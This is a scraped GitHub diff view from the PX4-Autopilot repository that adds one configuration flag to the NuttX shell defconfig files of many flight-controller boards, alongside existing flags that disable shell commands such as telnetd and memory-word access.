[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/bitcraze/crazyflie21/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -96,6 +96,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_FATDEVNO=0 |
|  |  | CONFIG\_NSH\_LINELEN=128 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cuav/can-gps-v1/nuttx-config/nsh/defconfig](#diff-5dedfc875937a58f9df0c95c195ec12626a2fc3c265f4f8c358625bdda8391d3 "boards/cuav/can-gps-v1/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cuav/can-gps-v1/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -81,6 +81,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cuav/nora/nuttx-config/nsh/defconfig](#diff-b72989161da426d15749f82fe38d2c5be8ae0fe8bd42f3d45d4e11821b9d74f3 "boards/cuav/nora/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cuav/nora/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cuav/x7pro/nuttx-config/nsh/defconfig](#diff-5d5f4fa8cff5fa69a1c70a5b84b185f6001460559ef9f5cf376548838a311d5a "boards/cuav/x7pro/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cuav/x7pro/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cubepilot/cubeorange/nuttx-config/console/defconfig](#diff-027457ff3a8aeb84ea3b4891fbf3ab68d0c8cd3835b4cbe910434e662bc1a4c3 "boards/cubepilot/cubeorange/nuttx-config/console/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cubepilot/cubeorange/nuttx-config/console/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cubepilot/cubeorange/nuttx-config/nsh/defconfig](#diff-30457126b7612ef4d5e2236ad929823d1974d0bb7e304cd77116135c1c15737e "boards/cubepilot/cubeorange/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cubepilot/cubeorange/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -108,6 +108,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cubepilot/cubeyellow/nuttx-config/console/defconfig](#diff-003c0ee9f7ea1a7defb720f8d676d876ef193870868902fa391c5dc192e14a2b "boards/cubepilot/cubeyellow/nuttx-config/console/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cubepilot/cubeyellow/nuttx-config/console/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/cubepilot/cubeyellow/nuttx-config/nsh/defconfig](#diff-4017c0d84fe3b40c0c6cf55f94beec759c3b717910af39575b4b267afc527e58 "boards/cubepilot/cubeyellow/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/cubepilot/cubeyellow/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/holybro/can-gps-v1/nuttx-config/nsh/defconfig](#diff-87a251812830ca7aa3b3d3d19f849029143caa2ef347ea9fe5434b7fc39babaf "boards/holybro/can-gps-v1/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/holybro/can-gps-v1/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -86,6 +86,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/holybro/durandal-v1/nuttx-config/nsh/defconfig](#diff-f0dba8efb5733fe8835f535d1d349b711482007bf5271c52f87870531bc8f0c5 "boards/holybro/durandal-v1/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/holybro/durandal-v1/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/holybro/kakutef7/nuttx-config/nsh/defconfig](#diff-16ad9b988c04376612b48da79d29158283fe826e810be171e852a684a5059890 "boards/holybro/kakutef7/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/holybro/kakutef7/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PSSTACKUSAGE=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/holybro/pix32v5/nuttx-config/nsh/defconfig](#diff-20de51f4060dac65d510453da53195f63b2f7d9be1b2a43f0c17ee2fc4b56112 "boards/holybro/pix32v5/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/holybro/pix32v5/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -106,6 +106,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/modalai/fc-v1/nuttx-config/nsh/defconfig](#diff-577d7abf45925573da05b18d277224f63c332e7e4b721e08d6bb26a9334bc392 "boards/modalai/fc-v1/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/modalai/fc-v1/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/ctrl-zero-f7-oem/nuttx-config/nsh/defconfig](#diff-6022c19cc57613823a4db516321f1631fe5333b8ed37c26e90d5d100673255d2 "boards/mro/ctrl-zero-f7-oem/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/ctrl-zero-f7-oem/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/ctrl-zero-f7/nuttx-config/nsh/defconfig](#diff-237900f42dfc417bcd89c00ce313dd61f6d77b8068ab3618bcf11949d7c266ab "boards/mro/ctrl-zero-f7/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/ctrl-zero-f7/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/ctrl-zero-h7-oem/nuttx-config/nsh/defconfig](#diff-b3378a1588b82b3431a950db40ff71f487a4437168893fae47ccee2defd273f5 "boards/mro/ctrl-zero-h7-oem/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/ctrl-zero-h7-oem/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -108,6 +108,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/ctrl-zero-h7/nuttx-config/nsh/defconfig](#diff-518b7d0878ad0973de931d6d2a6a52b1ab842604016034977f0fe80ea1b2cab3 "boards/mro/ctrl-zero-h7/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/ctrl-zero-h7/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/pixracerpro/nuttx-config/nsh/defconfig](#diff-bac9a246872340675afacaff22a4dfe692a81c7251f1f12cca8095ab3757243b "boards/mro/pixracerpro/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/pixracerpro/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/x21-777/nuttx-config/nsh/defconfig](#diff-52a1f498a7a0b1e14560a4dde06d33e68ae884401201f0828b866533d3c51274 "boards/mro/x21-777/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/x21-777/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/mro/x21/nuttx-config/nsh/defconfig](#diff-66328b747dda7c3db05874107fd740babdcb519456a61e0ef8a4ae44a20697a8 "boards/mro/x21/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/mro/x21/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/nxp/fmuk66-e/nuttx-config/nsh/defconfig](#diff-9f5a79694be5a64fd4caef5278f47f4f044eeefbabeb9ea2616fa80ef87246ec "boards/nxp/fmuk66-e/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/nxp/fmuk66-e/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -146,6 +146,7 @@ CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_REBOOT=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/nxp/fmuk66-e/nuttx-config/socketcan/defconfig](#diff-a92e949b98323270305480b1190d737e238a8b3ed7d6e07da05b72ed388f5568 "boards/nxp/fmuk66-e/nuttx-config/socketcan/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/nxp/fmuk66-e/nuttx-config/socketcan/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -145,6 +145,7 @@ CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_REBOOT=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/nxp/fmuk66-v3/nuttx-config/nsh/defconfig](#diff-765841fe678ca481c4034b5b50e159304a9e06ff713906bf0387804829fe0df0 "boards/nxp/fmuk66-v3/nuttx-config/nsh/defconfig")

Show comments

